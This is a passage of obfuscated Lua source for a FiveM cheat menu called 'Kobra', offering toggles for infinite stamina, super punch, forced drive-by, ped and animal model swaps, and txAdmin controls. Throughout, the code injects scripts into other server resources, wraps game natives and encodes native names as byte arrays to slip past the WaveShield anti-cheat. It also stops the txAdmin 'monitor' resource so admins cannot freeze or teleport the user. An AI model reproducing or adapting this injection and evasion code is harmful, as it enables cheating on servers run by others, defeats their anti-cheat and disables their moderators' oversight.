                                    gKdNqLpYxMiV(function()
                                        while kJfGhTrEeWqAsDz and not Unloaded do
                                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                            qWeRtYuIoPlMnBv(0)
                                            aSdFgHjKlQwErTy(0)
                                            Wait(0)
                                        end
                                    end)
                                end

                                pqkTRWZ38y()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                kJfGhTrEeWqAsDz = false
                                ]]);end end},{type="checkbox",label="Force Driveby",checked=false,desc="This will enable driveby if disabled.",onSelect=function(v363) if v363 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                                zXcVbNmQwErTyUi = true

                                local function UEvLBcXqM6()
                                    local cVbNmAsDfGhJkLz = CreateThread
                                    cVbNmAsDfGhJkLz(function()
                                        while zXcVbNmQwErTyUi and not Unloaded do
                                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                                            local eRtYuIoPaSdFgHi = PlayerPedId()

                                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                                            Wait(0)
                                        end
                                    end)
                                end

                                UEvLBcXqM6()
                                ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetPlayerCanDoDriveBy", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                zXcVbNmQwErTyUi = false
                                ]]);end end},{type="checkbox",label="Infinite Stamina",checked=false,desc="This will enable Infinite Stamina.",onSelect=function(v364) if v364 then v12:Notify("success","Kobra","Infinite Stamina On",3725 -(267 + 458) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.infiniteStaminaEnabled then
                                                _G.infiniteStaminaEnabled = true

                                                local GetPlayerId_fn      = g({80,108,97,121,101,114,73,100})
                                                local RestoreStamina_fn   = g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                                                local Wait_fn             = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[InfiniteStamina] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.infiniteStaminaEnabled do
                                                        local pid = GetPlayerId_fn()
                                                        if pid then
                                                            RestoreStamina_fn(pid, 1.0)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.staminaThreadActive == nil then _G.staminaThreadActive = false end
                                            if _G.infiniteStaminaEnabled == nil then
                                                _G.infiniteStaminaEnabled = true

                                                local function ThreadStart()
                                                    local CreateThread_fn = CreateThread
                                                    local Wait_fn         = Wait
                                                    local PlayerId_fn     = PlayerId
                                                    local Restore_fn      = RestorePlayerStamina

                                                    CreateThread_fn(function()
                                                        while true do
                                                            Wait_fn(0)
                                                            if not _G.infiniteStaminaEnabled then
                                                                Wait_fn(500)
                                                                goto continue
                                                            end

                                                            local pid = PlayerId_fn()
                                                            if pid then
                                                                Restore_fn(pid, 1.0)
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                ThreadStart()
                                            end
                                            _G.infiniteStaminaEnabled = true
                                        ]]);end else local v592=0;while true do if (v592==(0 + 0)) then v12:Notify("error","Kobra","Infinite Stamina Off",5769 -2769 );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.infiniteStaminaEnabled = false
                                        ]]);end break;end end end end},{type="checkbox",label="Tiny Ped",checked=false,desc="This will turn you into a tiny ped.",onSelect=function(v365) local v366=((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v365 then v48(v366,[[
                                        if not _G.KobraTinyPedInjected then
                                            _G.KobraTinyPedInjected = true
                                            _G.KobraTinyPedEnabled = true

                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...)
                                                    return newFunction(originalNative, ...)
                                                end
                                            end

                                            hNative("SetPedConfigFlag", function(originalFn, ...) return originalFn(...) end)

                                            -- One-shot initflow (no looping)
                                            function initflow(name, fn)
                                                if not _G.__flows then _G.__flows = {} end
                                                if _G.__flows[name] then
                                                    _G.__flows[name].active = false
                                                end
                                                local flow = { active = true }
                                                _G.__flows[name] = flow

                                                SetTimeout(0, function()
                                                    if flow.active then
                                                        fn()
                                                    end
                                                end)
                                            end
                                        else
                                            _G.KobraTinyPedEnabled = true
                                        end

                                        initflow("TinyPedOnce", function()
                                            local ped = PlayerPedId()
                                            if ped and ped ~= 0 then
                                                SetPedConfigFlag(ped, 223, true)
                                            end
                                        end)
                                    ]]);else v48(v366,[[
                                        _G.KobraTinyPedEnabled = false
                                        local ped = PlayerPedId()
                                        if ped and ped ~= 0 then
                                            SetPedConfigFlag(ped, 223, false)
                                        end
                                    ]]);end end},{type="checkbox",label="Super Punch",checked=false,onSelect=function(v367) local v368=0;local v369;local v370;while true do if (v368==(1498 -(1410 + 87))) then if v367 then if v369 then v12:Notify("success","Kobra","Super Punch Enabled",4897 -(1504 + 393) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local setMeleeMod = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicleMod = SetPlayerVehicleDamageModifier
                                                local setWeaponMod = SetWeaponDamageModifier
                                                local playerId = PlayerId
                                                local unarmedHash = GetHashKey("WEAPON_UNARMED")
                                                local damageValue = 150.0

                                                while superPunchEnabled and not Unloaded do
                                                    Wait(0)
                                                    local pid = playerId()
                                                    setMeleeMod(pid, damageValue)
                                                    setVehicleMod(pid, damageValue)
                                                    setWeaponMod(unarmedHash, damageValue)
                                                end

                                                -- Restore on disable
                                                local pid = playerId()
                                                setMeleeMod(pid, 1.0)
                                                setVehicleMod(pid, 1.0)
                                                setWeaponMod(unarmedHash, 1.0)
                                            end)
                                        ]]);else local v927=0 -0 ;while true do if (v927==(0 -0)) then v48(v370,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerMeleeWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPlayerVehicleDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetWeaponDamageModifier", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)

                                            if superPunchEnabled == nil then superPunchEnabled = false end
                                            superPunchEnabled = true

                                            local function startSuperPunch()
                                                local create = CreateThread
                                                local wait = Wait
                                                local setMelee = SetPlayerMeleeWeaponDamageModifier
                                                local setVehicle = SetPlayerVehicleDamageModifier
                                                local setWeapon = SetWeaponDamageModifier
                                                local getPlayer = PlayerId
                                                local hashKey = GetHashKey

                                                create(function()
                                                    local unarmedHash = hashKey("WEAPON_UNARMED")
                                                    local damageValue = 150.0

                                                    while superPunchEnabled and not Unloaded do
                                                        local pid = getPlayer()
                                                        setMelee(pid, damageValue)
                                                        setVehicle(pid, damageValue)
                                                        setWeapon(unarmedHash, damageValue)
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local pid = getPlayer()
                                                    setMelee(pid, 1.0)
                                                    setVehicle(pid, 1.0)
                                                    setWeapon(unarmedHash, 1.0)
                                                end)
                                            end

                                            startSuperPunch()
                                        ]]);v12:Notify("success","Kobra","Super Punch Enabled (Fallback)",3796 -(461 + 335) );break;end end end elseif v369 then v12:Notify("error","Kobra","Super Punch Disabled",384 + 2616 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            superPunchEnabled = false
                                        ]]);else v48(v370,[[
                                            superPunchEnabled = false
                                        ]]);v12:Notify("error","Kobra","Super Punch Disabled (Fallback)",4761 -(1730 + 31) );end break;end if (v368==0) then v369=GetResourceState("WaveShield")=="started" ;v370=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v368=1;end end end},{type="divider",label="txAdmin Options"},{type="checkbox",label="txAdmin Player IDs",checked=false,desc="This will toggle txAdmin Player ids.",onSelect=function(v371) if v371 then MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(true, true)
                                ]]);else MachoInjectResource2(AsThreadNs,"monitor",[[
                                menuIsAccessible = true
                                toggleShowPlayerIDs(false, true)
                                ]]);end end},{type="checkbox",label="txAdmin Noclip",checked=false,desc="This will toggle txAdmin noclip.",onSelect=function(v372) if v372 then if (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","noclip",true);else MachoInjectResource2(5 -2 ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(true, true)
                                        ]]);end elseif (GetResourceState("WaveShield")=="started") then TriggerEvent("txcl:setPlayerMode","none",true);else MachoInjectResource2(6 -3 ,"monitor",[[
                                            menuIsAccessible = true
                                            toggleShowPlayerIDs(false, true)
                                        ]]);end end},{type="checkbox",label="Disable All txAdmin",checked=false,desc="This will disable txAdmin options from admins using them against you.",onSelect=function(v373) if v373 then local v593=1068 -(138 + 930) ;while true do if (v593==(0 + 0)) then MachoResourceStop("monitor");print("started");break;end end else print("stopped");MachoResourceStart("monitor");end end},{type="checkbox",label="Disable txAdmin Teleport",checked=false,desc="This will disable txAdmin Teleport.",onSelect=function(v374) if v374 then MachoResourceStop("monitor");print("started");else print("stopped");MachoResourceStart("monitor");end end},{type="checkbox",label="Disable txAdmin Freeze",checked=false,desc="This will disable txAdmin Freeze.",onSelect=function(v375) if v375 then local v594=0;while true do if (v594==0) then MachoResourceStop("monitor");print("started");break;end end else print("stopped");MachoResourceStart("monitor");end end}}},{label="Wardrobe",tabs={{icon="",type="scrollable",value=1,values={"Random"},label="Outfit",desc="Apply a preset outfit",onSelect=function(v376) if (v376=="Random") then v48("any",[[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]]);end end},{type="divider",label="Ped Options"},{type="scrollable",label="Freemode",scrollType="onEnter",value=1,values={"Freemode Male","Freemode Female"},onSelect=function(v377) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v377));end},{type="scrollable",label="Peds",scrollType="onEnter",value=2 -1 ,values={"Michael","Franklin","Trevor","Lamar","Jimmy","Amanda","Tracey","Ron","Wade","Dave Norton","Steve Haines","Devin Weston","Floyd","Chef","Lester","Chop","Brad","Police Officer Male","Police Officer Female","SWAT","Sheriff Male","Sheriff Female","Highway Cop","FIB Male","FIB Female","Paramedic","Firefighter","Doctor","Construction Worker","Pilot Male","Pilot Female","Business Male","Business Female","Street Dealer","Gang Male 1","Gang Male 2","Gang Female 1","Ballas 1","Ballas 2","Ballas Female","Families 1","Families 2","Vagos 1","Vagos 2","Lost MC 1","Lost MC 2","Lost MC Female","Army Soldier","Marine 1","Marine 2","Prisoner Male","Prison Guard","Cop Undercover","Security Guard","Janitor","Hobo Male","Hobo Female","Prostitute 1","Prostitute 2","Beach Male","Beach Female","Tourist Male","Tourist Female","Skater","Hipster Male","Hipster Female","Bouncer","Shopkeeper","Chef","Bartender","Waiter","Mechanic","Taxi Driver","Gardener","Farmer","Dock Worker","Trash Worker","Postal Worker","Bus Driver","Pilot","Air Hostess","Cop Traffic","Cop Detective","Agent","Reporter","News Cameraman","Hunter","Hiker Male","Hiker Female","Golfer Male","Golfer Female","Tennis Player Male","Tennis Player Female"},onSelect=function(v378) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
                                    elseif selected == "Sheriff Female" then pedModel = "s_f_y_sheriff_01"
                                    elseif selected == "Highway Cop" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "FIB Male" then pedModel = "s_m_m_fibsec_01"
                                    elseif selected == "FIB Female" then pedModel = "s_f_m_fiboffice_02"
                                    elseif selected == "Paramedic" then pedModel = "s_m_m_paramedic_01"
                                    elseif selected == "Firefighter" then pedModel = "s_m_y_fireman_01"
                                    elseif selected == "Doctor" then pedModel = "s_m_m_doctor_01"
                                    elseif selected == "Construction Worker" then pedModel = "s_m_y_construct_01"
                                    elseif selected == "Pilot Male" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Pilot Female" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Business Male" then pedModel = "s_m_y_business_01"
                                    elseif selected == "Business Female" then pedModel = "s_f_y_business_01"
                                    elseif selected == "Street Dealer" then pedModel = "g_m_y_mexgoon_02"
                                    elseif selected == "Gang Male 1" then pedModel = "g_m_y_ballaorig_01"
                                    elseif selected == "Gang Male 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Gang Female 1" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Ballas 1" then pedModel = "g_m_y_ballaeast_01"
                                    elseif selected == "Ballas 2" then pedModel = "g_m_y_ballasout_01"
                                    elseif selected == "Ballas Female" then pedModel = "g_f_y_ballas_01"
                                    elseif selected == "Families 1" then pedModel = "g_m_y_famca_01"
                                    elseif selected == "Families 2" then pedModel = "g_m_y_famdnf_01"
                                    elseif selected == "Vagos 1" then pedModel = "g_m_y_mexgoon_01"
                                    elseif selected == "Vagos 2" then pedModel = "g_m_y_mexgoon_03"
                                    elseif selected == "Lost MC 1" then pedModel = "g_m_y_lost_01"
                                    elseif selected == "Lost MC 2" then pedModel = "g_m_y_lost_02"
                                    elseif selected == "Lost MC Female" then pedModel = "g_f_y_lost_01"
                                    elseif selected == "Army Soldier" then pedModel = "s_m_y_marine_01"
                                    elseif selected == "Marine 1" then pedModel = "s_m_y_marine_02"
                                    elseif selected == "Marine 2" then pedModel = "s_m_y_marine_03"
                                    elseif selected == "Prisoner Male" then pedModel = "s_m_y_prismuscl_01"
                                    elseif selected == "Prison Guard" then pedModel = "s_m_m_prisguard_01"
                                    elseif selected == "Cop Undercover" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Security Guard" then pedModel = "s_m_m_security_01"
                                    elseif selected == "Janitor" then pedModel = "s_m_m_janitor"
                                    elseif selected == "Hobo Male" then pedModel = "a_m_m_tramp_01"
                                    elseif selected == "Hobo Female" then pedModel = "a_f_m_tramp_01"
                                    elseif selected == "Prostitute 1" then pedModel = "s_f_y_hooker_01"
                                    elseif selected == "Prostitute 2" then pedModel = "s_f_y_hooker_02"
                                    elseif selected == "Beach Male" then pedModel = "a_m_y_beach_01"
                                    elseif selected == "Beach Female" then pedModel = "a_f_y_beach_01"
                                    elseif selected == "Tourist Male" then pedModel = "a_m_y_tourist_01"
                                    elseif selected == "Tourist Female" then pedModel = "a_f_y_tourist_01"
                                    elseif selected == "Skater" then pedModel = "a_m_y_skater_01"
                                    elseif selected == "Hipster Male" then pedModel = "a_m_y_hipster_01"
                                    elseif selected == "Hipster Female" then pedModel = "a_f_y_hipster_01"
                                    elseif selected == "Bouncer" then pedModel = "s_m_m_bouncer_01"
                                    elseif selected == "Shopkeeper" then pedModel = "mp_m_shopkeep_01"
                                    elseif selected == "Chef" then pedModel = "s_m_y_chef_01"
                                    elseif selected == "Bartender" then pedModel = "s_m_y_barman_01"
                                    elseif selected == "Waiter" then pedModel = "s_m_y_waiter_01"
                                    elseif selected == "Mechanic" then pedModel = "s_m_y_xmech_02"
                                    elseif selected == "Taxi Driver" then pedModel = "s_m_m_trucker_01"
                                    elseif selected == "Gardener" then pedModel = "s_m_m_gardener_01"
                                    elseif selected == "Farmer" then pedModel = "a_m_m_farmer_01"
                                    elseif selected == "Dock Worker" then pedModel = "s_m_y_dockwork_01"
                                    elseif selected == "Trash Worker" then pedModel = "s_m_y_garbage"
                                    elseif selected == "Postal Worker" then pedModel = "s_m_m_postal_01"
                                    elseif selected == "Bus Driver" then pedModel = "s_m_o_busker_01"
                                    elseif selected == "Pilot" then pedModel = "s_m_m_pilot_01"
                                    elseif selected == "Air Hostess" then pedModel = "s_f_y_airhostess_01"
                                    elseif selected == "Cop Traffic" then pedModel = "s_m_y_hwaycop_01"
                                    elseif selected == "Cop Detective" then pedModel = "s_m_m_ciasec_01"
                                    elseif selected == "Agent" then pedModel = "s_m_m_fiboffice_02"
                                    elseif selected == "Reporter" then pedModel = "s_f_y_scrubs_01"
                                    elseif selected == "News Cameraman" then pedModel = "s_m_m_pilot_02"
                                    elseif selected == "Hunter" then pedModel = "a_m_m_hillbilly_02"
                                    elseif selected == "Hiker Male" then pedModel = "a_m_m_hiker_01"
                                    elseif selected == "Hiker Female" then pedModel = "a_f_m_hiker_01"
                                    elseif selected == "Golfer Male" then pedModel = "a_m_m_golfer_01"
                                    elseif selected == "Golfer Female" then pedModel = "a_f_m_golfer_01"
                                    elseif selected == "Tennis Player Male" then pedModel = "a_m_m_tennis_01"
                                    elseif selected == "Tennis Player Female" then pedModel = "a_f_m_tennis_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid ped selected: " .. tostring(selected))
                                    end
                                ]]):format(v378));end},{type="scrollable",label="Animal Peds",scrollType="onEnter",value=1,values={"Boar","Cat","Chicken","Chimp","Cow","Coyote","Crow","Deer","Dolphin","Fish","Hen","Humpback","Husky","Killer Whale","Mountain Lion","Pig","Pigeon","Poodle","Pug","Poodle","Rabbit","Rat","Retriever","Rhesus Monkey","Rottweiler","Seagull","Shepherd","Stingray","Tiger Shark","Hammerhead Shark","Cow","Cat2","Chickenhawk","Cormorant","Coyote2","Chimp2","Boar2","Deer2","Fish2","Husky2","Pug2","Poodle2","Retriever2","Shepherd2","Rat2","Rabbit2","Dolphin2","Killer Whale2","Mountain Lion2","Pig2","Seagull2","Stingray2","Tiger Shark2","Hammerhead Shark2"},onSelect=function(v379) MachoInjectResourceRaw("any",([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Boar" then
                                        pedModel = "a_c_boar"
                                    elseif selected == "Cat" then
                                        pedModel = "a_c_cat_01"
                                    elseif selected == "Chicken" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Chimp" then
                                        pedModel = "a_c_chimp"
                                    elseif selected == "Cow" then
                                        pedModel = "a_c_cow"
                                    elseif selected == "Coyote" then
                                        pedModel = "a_c_coyote"
                                    elseif selected == "Crow" then
                                        pedModel = "a_c_crow"
                                    elseif selected == "Deer" then
                                        pedModel = "a_c_deer"
                                    elseif selected == "Dolphin" then
                                        pedModel = "a_c_dolphin"
                                    elseif selected == "Fish" then
                                        pedModel = "a_c_fish"
                                    elseif selected == "Hen" then
                                        pedModel = "a_c_hen"
                                    elseif selected == "Humpback" then
                                        pedModel = "a_c_humpback"
                                    elseif selected == "Husky" then
                                        pedModel = "a_c_husky"
                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid animal selected: " .. tostring(selected))
                                    end
